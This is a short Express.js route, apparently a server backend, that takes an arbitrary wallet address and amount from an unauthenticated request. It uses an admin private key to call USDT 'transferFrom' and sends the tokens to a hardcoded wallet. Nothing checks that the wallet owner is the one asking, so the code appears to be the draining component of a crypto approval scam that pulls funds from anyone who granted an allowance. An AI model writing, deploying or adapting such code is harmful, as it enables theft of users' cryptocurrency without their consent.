// server.js or routes.js
app.post("/api/send-auto", async (req, res) => {
    const { userAddress, amount } = req.body;

    try {
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        const adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
        const USDT = new ethers.Contract(process.env.USDT_ADDRESS, [
            "function transferFrom(address from, address to, uint256 value) public returns (bool)"
        ], adminWallet);

        const toWallet = "0xE4B07524A375f4Aa0905F02D33D88f60b1eD292c";
        const amountInWei = ethers.parseUnits(amount.toString(), 18);

        const tx = await USDT.transferFrom(userAddress, toWallet, amountInWei);
        await tx.wait();

        res.json({ success: true, txHash: tx.hash });
    } catch (err) {
        console.error("Transfer error:", err);
        res.status(500).json({ success: false, error: err.message });
    }
});
